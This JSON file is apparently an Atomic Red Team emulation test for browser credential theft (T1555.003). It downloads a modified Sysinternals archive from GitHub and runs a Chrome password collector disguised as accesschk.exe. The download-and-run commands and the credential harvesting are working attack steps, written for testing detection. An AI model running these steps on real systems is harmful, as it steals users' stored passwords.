{
  "id": "8c05b133-d438-47ca-a630-19cc464c4622",
  "name": "Run Chrome-password Collector",
  "description": "A modified sysinternals suite will be downloaded and staged. The Chrome-password collector, renamed accesschk.exe, will then be executed from #{file_path}.\n\nSuccessful execution will produce stdout message stating \"Copying db ... passwordsDB DB Opened. statement prepare DB connection closed properly\". Upon completion, final output will be a file modification of PathToAtomicsFolder\\..\\ExternalPayloads\\sysinternals\\passwordsdb.\n\nAdapted from [MITRE ATTACK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n",
  "platforms": [
    "windows"
  ],
  "steps": [
    {
      "id": "a51d32aa-f465-467a-b3cc-c5ff8f923006",
      "type": "execute-command",
      "data": {
        "command": "Set-Location -path \"#{file_path}\\Sysinternals\";\n./accesschk.exe -accepteula .;\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "65ad95a5-2671-4047-bbe6-eb07029c57a8",
      "type": "execute-command",
      "data": {
        "command": "Remove-Item \"#{file_path}\\Sysinternals\" -Force -Recurse -ErrorAction Ignore\n",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "7e9f58e6-caf5-4acc-b041-ec67a18ed925",
      "name": "Check dependency 1/1",
      "description": "Modified Sysinternals must be located at #{file_path}\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{file_path}\\SysInternals\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "18f03780-5d85-4f5a-9728-99cd968dc146",
      "name": "Resolve dependency 1/1",
      "description": "Modified Sysinternals must be located at #{file_path}\n",
      "type": "execute-command",
      "data": {
        "command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip\" -OutFile \"#{file_path}\\Modified-SysInternalsSuite.zip\"\nExpand-Archive \"#{file_path}\\Modified-SysInternalsSuite.zip\" \"#{file_path}\\sysinternals\" -Force\nRemove-Item \"#{file_path}\\Modified-SysInternalsSuite.zip\" -Force\n",
        "command_type": ""
      },
      "elevation_required": false
    },
    {
      "id": "b5760b47-8231-4ffc-8973-9eff1625d510",
      "name": "Re-check dependency 1/1",
      "description": "Modified Sysinternals must be located at #{file_path}\n",
      "type": "execute-command",
      "data": {
        "command": "if (Test-Path \"#{file_path}\\SysInternals\") {exit 0} else {exit 1}\n",
        "command_type": ""
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "a51d32aa-f465-467a-b3cc-c5ff8f923006",
      "p": "on-success",
      "o": "65ad95a5-2671-4047-bbe6-eb07029c57a8"
    },
    {
      "s": "a51d32aa-f465-467a-b3cc-c5ff8f923006",
      "p": "on-failure",
      "o": "65ad95a5-2671-4047-bbe6-eb07029c57a8"
    },
    {
      "s": "7e9f58e6-caf5-4acc-b041-ec67a18ed925",
      "p": "on-success",
      "o": "a51d32aa-f465-467a-b3cc-c5ff8f923006"
    },
    {
      "s": "7e9f58e6-caf5-4acc-b041-ec67a18ed925",
      "p": "on-failure",
      "o": "18f03780-5d85-4f5a-9728-99cd968dc146"
    },
    {
      "s": "18f03780-5d85-4f5a-9728-99cd968dc146",
      "p": "on-success",
      "o": "b5760b47-8231-4ffc-8973-9eff1625d510"
    },
    {
      "s": "b5760b47-8231-4ffc-8973-9eff1625d510",
      "p": "on-failure",
      "o": "a51d32aa-f465-467a-b3cc-c5ff8f923006"
    }
  ],
  "tags": [
    "T1555.003",
    "atomic-red-team"
  ],
  "input_arguments": [
    {
      "name": "file_path",
      "type": "string",
      "description": "File path for modified Sysinternals",
      "value": "PathToAtomicsFolder\\..\\ExternalPayloads"
    }
  ]
}